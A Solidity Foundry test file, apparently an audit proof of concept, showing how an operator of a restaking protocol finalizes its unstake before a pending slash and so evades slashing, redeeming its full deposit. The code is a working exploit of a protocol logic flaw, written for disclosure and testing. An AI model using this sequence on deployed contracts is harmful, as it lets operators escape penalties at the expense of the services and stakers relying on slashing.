// SPDX-License-Identifier: SEE LICENSE IN LICENSE
pragma solidity ^0.8.25;

import "../helpers/OperatorHelper.sol";

// A DSS that allows staking but reverts in every unstake and slashing hook: it cannot block the operator's unstake.
contract HostileHooksDSS is IDSS {
    function registrationHook(address, bytes memory) external {}
    function unregistrationHook(address, bytes memory) external pure {
        revert();
    }

    function requestUpdateStakeHook(address, Operator.StakeUpdateRequest memory req) external pure {
        if (!req.toStake) revert();
    }

    function cancelUpdateStakeHook(address, address) external pure {
        revert();
    }

    function finishUpdateStakeHook(address) external pure {
        revert();
    }

    function requestSlashingHook(address, uint256[] memory) external pure {
        revert();
    }

    function cancelSlashingHook(address) external pure {
        revert();
    }

    function finishSlashingHook(address) external pure {
        revert();
    }

    function supportsInterface(bytes4) external pure returns (bool) {
        return true;
    }
}

contract Poc41 is OperatorHelper {
    Vault vault;
    bytes32 withdrawalKey;
    Operator.QueuedStakeUpdate queuedUnstake;
    uint256 t0;

    // Operator stakes vault 0, then immediately pre-schedules its unstake and queues a redeem of
    // all shares (the operator controls the depositor account in this scenario).
    function _prepare() internal {
        dss = IDSS(address(new HostileHooksDSS()));
        vm.prank(address(dss));
        core.registerDSS(dssMaxSlashablePercentageWad);

        stake_vaults_to_dss();
        vault = Vault(address(vaults[0]));
        t0 = block.timestamp;

        vm.prank(operator);
        queuedUnstake = core.requestUpdateVaultStakeInDSS(
            Operator.StakeUpdateRequest({vault: address(vault), dss: dss, toStake: false})
        );

        uint256 shares = vault.balanceOf(address(this));
        vault.approve(address(vault), shares);
        withdrawalKey = vault.startRedeem(shares, address(this));
    }

    function _slashRequest() internal view returns (SlasherLib.SlashRequest memory) {
        address[] memory v = new address[](1);
        v[0] = address(vault);
        uint96[] memory pct = new uint96[](1);
        pct[0] = uint96(10 * Constants.ONE_WAD);
        return SlasherLib.SlashRequest({operator: operator, slashPercentagesWad: pct, vaults: v});
    }

    function test_control_slash_requested_one_second_before_unstake_matures_succeeds() public {
        _prepare();
        vm.warp(t0 + Constants.MIN_STAKE_UPDATE_DELAY - 1);

        vm.prank(address(dss));
        SlasherLib.QueuedSlashing memory queued = core.requestSlashing(_slashRequest());

        vm.warp(block.timestamp + Constants.SLASHING_VETO_WINDOW);
        core.finalizeSlashing(queued);
        core.finalizeUpdateVaultStakeInDSS(queuedUnstake);
        vault.finishRedeem(withdrawalKey);

        assertEq(depositToken.balanceOf(address(this)), 900);
    }

    function test_operator_finalizes_unstake_first_and_slash_request_reverts() public {
        _prepare();
        vm.warp(t0 + Constants.MIN_STAKE_UPDATE_DELAY);

        assertEq(core.fetchVaultsStakedInDSS(operator, dss).length, 2);
        uint256 balBefore = depositToken.balanceOf(address(this));

        // Operator's finalize lands first. The DSS's hooks all revert, yet finalization still goes through.
        vm.prank(operator);
        core.finalizeUpdateVaultStakeInDSS(queuedUnstake);
        assertEq(core.fetchVaultsStakedInDSS(operator, dss).length, 1);

        // DSS wants to slash the vault for conduct while it was staked: the request reverts.
        SlasherLib.SlashRequest memory req = _slashRequest();
        vm.prank(address(dss));
        vm.expectRevert(VaultNotStakedToDSS.selector);
        core.requestSlashing(req);

        // The queued redeem matures in the same block and pays out the full amount.
        vault.finishRedeem(withdrawalKey);
        uint256 received = depositToken.balanceOf(address(this)) - balBefore;

        emit log_named_uint("vault 0 deposit", 1000);
        emit log_named_uint("received after evading slash", received);
        emit log_named_uint("vault 0 totalAssets left", vault.totalAssets());

        assertEq(received, 1000);
        assertEq(vault.totalAssets(), 0);
    }
}
